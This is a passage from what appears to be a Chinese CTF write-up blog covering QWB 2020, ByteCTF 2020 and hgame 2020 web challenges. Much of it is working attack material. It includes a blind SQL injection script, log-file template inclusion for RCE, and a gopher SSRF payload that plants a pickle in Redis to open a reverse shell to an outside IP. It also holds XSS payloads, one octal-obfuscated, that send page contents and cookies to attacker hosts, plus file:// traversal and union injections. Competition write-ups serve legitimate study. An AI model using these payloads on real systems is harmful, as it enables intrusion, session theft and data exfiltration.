may_r=decrypt(&#39;f^n2ekass:iy~&gt;w|`ef&quot;${Ip)8if&#39;)
for i in may_r:
    print(i[::2]+i[1::2])</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2019xman个人排位赛wp/">https://www.ccreater.top/1970/01/01/2019xman个人排位赛wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="ckmn5754g0006s1ni7ay40ahj" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020-QWB-final-bjyadmin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020-QWB-final-bjyadmin/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020-QWB-final-bjyadmin/">2020-QWB-final-bjyadmin</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-QWB-final-bjyadmin"><a href="#2020-QWB-final-bjyadmin" class="headerlink" title="2020-QWB-final-bjyadmin"></a>2020-QWB-final-bjyadmin</h1><h2 id="第一步sql注入"><a href="#第一步sql注入" class="headerlink" title="第一步sql注入"></a>第一步sql注入</h2><blockquote>
<p>选手使用攻击机利用靶机中的sql注入漏洞获取bjyadmin框架路径</p>
</blockquote>
<pre><code># mysql&gt; select info from PROCESSLIST;
# +------------------------------+
# | info                         |
# +------------------------------+
# | select info from PROCESSLIST |
# +------------------------------+
# 1 row in set (0.00 sec)</code></pre><p>利用processlist注出字段名，<a href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-processlist-table.html" target="_blank" rel="noopener">相关的介绍</a></p>
<pre><code class="python">import requests
import time
ip=&quot;192.168.10.110&quot;
#http://101.133.129.243/
def inj(pos,guess):
    # true: real-guess &lt; 0
    # false : guess &lt;= real
    burp0_url = &quot;http://&quot;+ip+&quot;/?id=1&#39;/(if(floor((SELECT(ord(right(left(group_concat(info),{POS}),1)))FROM(information_schema.PROCESSLIST))/{GUESS}),1,0))/&#39;1&quot;.format(POS=pos,GUESS=guess)
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    r=requests.get(burp0_url, headers=burp0_headers,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})

    if &quot;Undefined variable: rows in&quot; in r.text:
        return True
    return False
# &quot;http://101.133.129.243:80/?id=1&#39;/(if(floor((SELECT(ord(right(left(group_concat(schema_name),{POS}),1)))FROM(information_schema.schemata))/{GUESS}),1,0))/&#39;1&quot;
# database:2020qwbctf 
# table_name:
result=&quot;&quot;
pos=len(result)+1
while True:
    min=32
    max=128
    print(result)
    while True:
        #time.sleep(1)

        avr = int((min+max)/2)
        print(avr)
        if not inj(pos,avr):
            if inj(pos,avr+1):
                result+=chr(avr)
                break
            else:
                min=avr
        else:
            max=avr
        if max-min == 1:
            if not inj(pos,min):
                result+=chr(max)

            else:
                result+=chr(min)
            break



    pos+=1</code></pre>
<h2 id="bjyadmin"><a href="#bjyadmin" class="headerlink" title="bjyadmin"></a>bjyadmin</h2><p>题目提供的附件和</p>
<p><a href="https://github.com/baijunyao/thinkphp-bjyadmin" target="_blank" rel="noopener">https://github.com/baijunyao/thinkphp-bjyadmin</a></p>
<p>一摸一样</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200921120236.png" alt="image2362"></p>
<p>挨个看过去发现有一个容易令人忽略的漏洞（sxgg一眼看出来）</p>
<pre><code class="php">&lt;?php
namespace Home\Controller;
use Common\Controller\HomeBaseController;
/**
 * Vue示例
 */
class VueController extends HomeBaseController{

    /**
     * 拦截空方法 自动加载html
     * @param  string $methed_name 空方法
     */
    public function _empty($methed_name){
        $this-&gt;display($methed_name);
        exit(0);
    }

    /**
     * 配合thinkphp分页示例
     */
    public function page(){
        // 获取总条数
        $count=M(&#39;Province_city_area&#39;)-&gt;count();
        // 每页多少条数据
        $limit=200;
        $page=new \Org\Nx\Page($count,$limit);
        $data=M(&#39;Province_city_area&#39;)
            -&gt;limit($page-&gt;firstRow.&#39;,&#39;.$page-&gt;listRows)
            -&gt;select();
        echo json_encode($data);
    }

}</code></pre>
<blockquote>
<h1 id="ThinkPHP-Action中的-empty方法"><a href="#ThinkPHP-Action中的-empty方法" class="headerlink" title="ThinkPHP Action中的_empty方法"></a>ThinkPHP Action中的_empty方法</h1><p>_empty方法即空操作，当找不到请求的方法时，默认执行该方法，利用这个机制，我们可以实现错误页面和一些URL的优化。</p>
<pre><code>public function _empty($name)
{
   echo $name;
}</code></pre><p>参数name,即请求的方法名。如<a href="http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf" target="_blank" rel="noopener">http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf</a>.</p>
</blockquote>
<p>当我们调用一个不存在的action时，它会<code>display ($method)</code> ，这将会造成任意模板调用</p>
<p>我们利用<code>index.php?m=Home&amp;c=Vue&amp;a=evil_path</code>来调用任意模板，我们可以利用日志文件作为模板文件从而RCE</p>
<p>最后的payload:</p>
<pre><code>index.php/Home.php?m=Home&amp;c=Vue&amp;a=Runtime/Logs/User/20_09_17.log
index.php/Home/Vue/web_page&amp;content=&lt;?php/**/phpinfo();</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020-QWB-final-bjyadmin/">https://www.ccreater.top/1970/01/01/2020-QWB-final-bjyadmin/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020-QWB-final-bjyadmin/" data-id="ckmn5754h0007s1nife903bcf" data-title="2020-QWB-final-bjyadmin" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020ByteCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020ByteCTF/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020ByteCTF/">2020ByteCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ByteCTF2020"><a href="#ByteCTF2020" class="headerlink" title="ByteCTF2020"></a>ByteCTF2020</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h3><p>体验一编网站的功能后，发现如下api</p>
<pre><code>/list
/push post:url=https%3A%2F%2Fwww.4399.com&amp;code=16674458
/result?url=https://www.4399.com</code></pre><p>让网站爬取自己的服务器以获得请求头</p>
<pre><code>GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en
User-Agent: scrapy_redis
Accept-Encoding: gzip, deflate
Host: ccreater.top:60000

</code></pre><p>通过ua头发现是：scrapy_redis</p>
<p>本地搭建scrapy_redis服务爬取网站，查看redis里设置的键值，发现myscrapy:requests中</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201026113031.png" alt="image528"></p>
<p>存在的pickle数据</p>
<p>网站自然提交http和https协议的url，但是因为是爬虫猜测嵌入一个a标签就可以绕过这个限制</p>
<p>提交如下网站</p>
<pre><code>&lt;a href=&quot;file:///etc/passwd&quot;&gt;</code></pre><p>成功读取到/etc/passwd，把爬虫代码爬下来本地测试</p>
<p>scrapy.cfg</p>
<pre><code class="python"># Automatically created by: scrapy startproject
#
# For more information about the [deploy] section see:
# https://scrapyd.readthedocs.io/en/latest/deploy.html

[settings]
default = bytectf.settings

[deploy]
#url = http://localhost:6800/
project = bytectf</code></pre>
<p>bytectf/settings.py</p>
<pre><code class="python">BOT_NAME = &#39;bytectf&#39;
SPIDER_MODULES = [&#39;bytectf.spiders&#39;]
NEWSPIDER_MODULE = &#39;bytectf.spiders&#39;
RETRY_ENABLED = False
ROBOTSTXT_OBEY = False
DOWNLOAD_TIMEOUT = 8
USER_AGENT = &#39;scrapy_redis&#39;
SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;
DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;
REDIS_HOST = &#39;172.20.0.7&#39;
REDIS_PORT = 6379
ITEM_PIPELINES = {
   &#39;bytectf.pipelines.BytectfPipeline&#39;: 300,
}</code></pre>
<p>bytectf/byte.py</p>
<pre><code class="python">import scrapy
import re
import base64
from scrapy_redis.spiders import RedisSpider
from bytectf.items import BytectfItem

class ByteSpider(RedisSpider):
    name = &#39;byte&#39;

    def parse(self, response):
        byte_item = BytectfItem()
        byte_item[&#39;byte_start&#39;] = response.request.url#ä¸»é®ï¼åå§url
        url_list = []
        test = response.xpath(&#39;//a/@href&#39;).getall()
        for i in test:
            if i[0] == &#39;/&#39;:
                url = response.request.url + i
            else:
                url = i
            if re.search(r&#39;://&#39;,url):
                r = scrapy.Request(url,callback=self.parse2,dont_filter=True)
                r.meta[&#39;item&#39;] = byte_item
                yield r
                url_list.append(url)
                if(len(url_list)&gt;3):
                    break
        byte_item[&#39;byte_url&#39;] = response.request.url
        byte_item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
        yield byte_item

    def parse2(self,response):
        item = response.meta[&#39;item&#39;]
        item[&#39;byte_url&#39;] = response.request.url
        item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
        yield item</code></pre>
<p>bytectf/items.py</p>
<pre><code class="python">import scrapy


class BytectfItem(scrapy.Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    byte_start = scrapy.Field()#
    byte_text = scrapy.Field()#text</code></pre>
<p>bytectf/pipelines.py</p>
<pre><code class="python">import pymongo

class BytectfPipeline:
    def __init__:
        MONGODB_HOST = &#39;172.20.0.8&#39;
        MONGODB_PORT = 27017
        MONGODB_DBNAME = &#39;result&#39;
        MONGODB_TABLE = &#39;result&#39;
        MONGODB_USER = &#39;N0rth3&#39;
        MONGODB_PASSWD = &#39;E7B70D0456DAD39E22735E0AC64A69AD&#39;
        mongo_client = pymongo.MongoClient(&quot;%s:%d&quot; % (MONGODB_HOST, MONGODB_PORT))
        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)
        mongo_db = mongo_client[MONGODB_DBNAME]
        self.table = mongo_db[MONGODB_TABLE]



    def process_item(self, item, spider):
        quote_info = dict(item)
        print(quote_info)
        self.table.insert(quote_info)
        return item</code></pre>
<p>测试<code>&lt;a href=&quot;gopher://.....&quot;&gt;</code>发现并不能解析gopher协议</p>
<p>继续测试发现接口<code>/result?url=https://www.4399.com</code>，也存在ssrf漏洞且至此gopher协议</p>
<p>传入以下payload:</p>
<pre><code>gopher%3a//172.20.0.7%3a6379/_%250D%250Azadd%2520byte%253Arequests%25201%2520%2522cos%255Cnsystem%255Cn%2528S%2527python%2520-c%2520%255Cx27import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253Bs.connect%2528%2528%255Cx2239.108.164.219%255Cx22%252C60003%2529%2529%253Bos.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253Bp%253Dsubprocess.call%2528%255B%255Cx22/bin/sh%255Cx22%252C%255Cx22-i%255Cx22%255D%2529%253B%255Cx27%2527%255CntR.%2522%250D%250Aquit%250D%250A</code></pre><p>成功弹回shell</p>
<h3 id="douyin-vedio"><a href="#douyin-vedio" class="headerlink" title="douyin_vedio"></a>douyin_vedio</h3><p>题目描述</p>
<blockquote>
<p>Do you like douyin video?<br>Submit your payload at <a href="http://c.bytectf.live:30002/" target="_blank" rel="noopener">http://c.bytectf.live:30002/</a></p>
<p>( Server URLs which only admin can access:<br><a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a><br><a href="http://b.bytectf.live:30001/" target="_blank" rel="noopener">http://b.bytectf.live:30001/</a> )</p>
</blockquote>
<p>题目中只能将<a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a> 开头的url发给管理员，而c.bytectf.live中存在未过滤的xss点</p>
<p>思路就很清晰了，想办法跳转到c.bytectf.live再说，我们查看源代码发现：</p>
<pre><code>RewriteRule /favicon.ico$ /favicon.ico [QSA,PT,L]
RewriteRule /$ / [QSA,PT,L]
RewriteRule /search$ /search [QSA,PT,L]
RewriteRule /send$ /send [QSA,PT,L]
RewriteRule /static/(.*)$ /static/$1 [QSA,PT,L]
RewriteRule (.*)$ http://www.douyin.com$1  </code></pre><p>最后一个神奇的重写规则，所以我们只要在<a href="http://www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss" target="_blank" rel="noopener">www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss</a></p>
<p>通常url跳转常出现在登入登出，还有外站url跳转，顺着这个思路我们可以找到<code>http://www.douyin.com/logout/?next=https%3A%2F%2Fwww.douyin.com/23333</code>可以跳转到部分域名(<a href="http://www.douyin.com" target="_blank" rel="noopener">www.douyin.com</a> , creator.douyin.com …)</p>
<p>这样就扩大了我们的攻击面，继续按照相同的思路进一步扩大攻击面的url:<code>https://creator.douyin.com/passport/web/logout/?next=https://www.douyin.com</code></p>
<p>测试发现可以跳转到任意<code>douyin.com/bytedance.com/.bytecdn.cn/ixigua.com/bytedance.net/snssdk.com/toutiao.com/huoshan.com/jinritemai.com</code>结尾的域名</p>
<p>接着用谷歌搜索：<code>site:xxxxxxx.com 跳转</code> 发现任意url跳转:<code>https://tsearch-quic.snssdk.com/search/jump?url=http://ccreater.top:60080</code></p>
<p>组合成跳转到c.bytectf.live的url:</p>
<pre><code>http://a.bytectf.live:30001/logout?next=https%3a//creator.douyin.com/passport/web/logout/%3fnext%3dhttps://tsearch-quic.snssdk.com/search/jump?url=http://c.bytectf.live:30002/?action=post%25252526id=b44cb32f302e2d4249dea06a2ffa0da1</code></pre><p>因为安全策略的设置问题(<code>frame-ancestors http://*.bytectf.live:*/</code>覆盖了<code>[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;</code>)，导致我们可以直接作为iframe导入，读取内容</p>
<pre><code>    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;
    resp.headers[&#39;Content-Security-Policy&#39;] = &quot;default-src http://*.bytectf.live:*/ &#39;unsafe-inline&#39;; frame-src *; frame-ancestors http://*.bytectf.live:*/&quot;
    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;
    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;</code></pre><p>所以xss的代码是：</p>
<pre><code class="javascript">document.domain=&quot;bytectf.live&quot;; 
flagPage=document.createElement(&quot;iframe&quot;); flagPage.src=&quot;http://a.bytectf.live:30001/?keyword=B&quot;; document.body.append(flagPage); setTimeout(()=&gt;{ document.location=&quot;http://ccreater.top:60001/&quot;+btoa(document.body.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.document.body.innerHTML) },500)
</code></pre>
<p>但是不知道为啥iframe.src=<code>http://a.bytectf.live:30001/</code>可以获取到内容，而<code>http://a.bytectf.live:30001/send</code>却不可以。。。</p>
<p>监听端口成功拿到flag</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020ByteCTF/">https://www.ccreater.top/1970/01/01/2020ByteCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020ByteCTF/" data-id="ckmn5754i0008s1ni63greyfk" data-title="2020ByteCTF" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020hgame" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020hgame/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020hgame/">2020hgame</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote>
<p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p>
</blockquote>
<p>根据提示下载.git</p>
<pre><code class="bash">$ git remote -v
#查看git</code></pre>
<p>查看提交历史拿到flag</p>
<h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p>
<pre><code>GET / HTTP/1.1
Host: kyaru.hgame.n3ko.co
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Cosmos Brower
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
referer: https://vidar.club/ 
x-forwarded-for: 127.0.0.1
If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT
Connection: close

</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p>
<p>修改GET为post</p>
<h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p>
<h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><pre><code class="php">&lt;?php
include &quot;config.php&quot;;
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET[&#39;debug&#39;])) {
        $debug = $_GET[&#39;debug&#39;];
        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
            die(&quot;args error!&quot;);
        }
        eval(&quot;var_dump($$debug);&quot;);
    }
}

if(isset($_SESSION[&#39;username&#39;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}
else {
    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){
            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];
            header(&quot;Location: admin.php&quot;);
            exit();
        }
        else {
            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;
        }
    }
}
?&gt;
</code></pre>
<p>adminpassword: 0e114902927253523756713132279690 </p>
<p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p>
<p>adminusername: Cosmos! </p>
<p>index.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
session_start();

if(isset($_SESSION[&#39;username&#39;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}

$action = @$_GET[&#39;action&#39;];
$filter = &quot;/config|etc|flag/i&quot;;

if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {
    if(preg_match($filter, $_GET[&#39;action&#39;])) {
        echo &quot;Hacker get out!&quot;;
        exit();
    }
        include $action;
}
elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {
    header(&quot;Location: ?action=login.php&quot;);
    exit();
}</code></pre>
<p>admin.php</p>
<pre><code class="php">&lt;?php
include &quot;config.php&quot;;
session_start();
if(!isset($_SESSION[&#39;username&#39;])) {
    header(&#39;Location: index.php&#39;);
    exit();
}

function insert_img() {
    if (isset($_POST[&#39;img_url&#39;])) {
        $img_url = @$_POST[&#39;img_url&#39;];
        $url_array = parse_url($img_url);
        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
    }
}
?&gt;

&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;
</code></pre>
<p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p>
<p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p>
<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p>
<p>过滤:select</p>
<p>黑名单:空格</p>
<pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#
information_schema,easysql
0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
f1aggggggggggggg,messages#
GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;
fl4444444g

hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p>
<pre><code class="php">&lt;?php

// function encrypt($str){
//     $result = &#39;&#39;;
//     for($i = 0; $i &lt; strlen($str); $i++){
//         $result .= chr(ord($str[$i]) + 1);
//     }
//     return $result;
// }
function encrypt($str)
{
    $result = &#39;&#39;;
    for($i = 0; $i &lt; strlen($str); $i++){
        $result .= chr(ord($str[$i]) - 1);
    }
    return $result;
}
$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;
$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);
preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;)
{
    $arr=array();
    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
    $newcmd=$arr[0].$newcmd.&quot;)&quot;;    
    $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

}

$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    


$dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);
?&gt;</code></pre>
<p>python </p>
<pre><code class="python">import requests
def get_flag():
    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]
    enccmd=enccmd[:len(enccmd)-75]
    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]
    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]
    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}
    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text
    data={&quot;token&quot;:dec}
    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])

get_flag()</code></pre>
<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre>
<p>输入会变成大写</p>
<h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p>
<p>而默认的逻辑是没法实现的</p>
<pre><code class="php">        if($this-&gt;rank &lt;= 2){
                $this-&gt;rank = 2;
            }</code></pre>
<p>阅读代码发现反序列化点:</p>
<p><code>Monster</code>的<code>__construct</code>方法</p>
<pre><code class="php">public function __construct($key){
        $this-&gt;encryptKey = $key;
        if(!isset($_COOKIE[&#39;monster&#39;])){
            $this-&gt;Set();
            return;
        }

        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);
        if(strlen($monsterData) &gt; 32){
            $sign = substr($monsterData, -32);
            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);
            if(md5($monsterData . $this-&gt;encryptKey) === $sign){
                $this-&gt;monsterData = unserialize($monsterData);
            }else{
                session_start();
                session_destroy();
                setcookie(&#39;monster&#39;, &#39;&#39;);
                header(&#39;Location: index.php&#39;);
                exit;
            }
        }

        $this-&gt;Set();     
    }</code></pre>
<p>但是要知道<code>$key</code>才能反序列化</p>
<p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p>
<pre><code class="php">
class Game
{   
    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;

    private $sign = &#39;&#39;;
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION[&#39;player&#39;] = $playerName;
        if(!isset($_SESSION[&#39;exp&#39;])){
            $_SESSION[&#39;exp&#39;] = 0;
        }
        $data = [$playerName, $this-&gt;encryptKey];
        $this-&gt;init($data);//set sign
        $this-&gt;monster = new Monster($this-&gt;sign);
        $this-&gt;rank = new Rank();
    }

    private function init($data){
        foreach($data as $key =&gt; $value){
            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
            $this-&gt;sign .= md5($this-&gt;sign . $value);
        }
    }
}</code></pre>
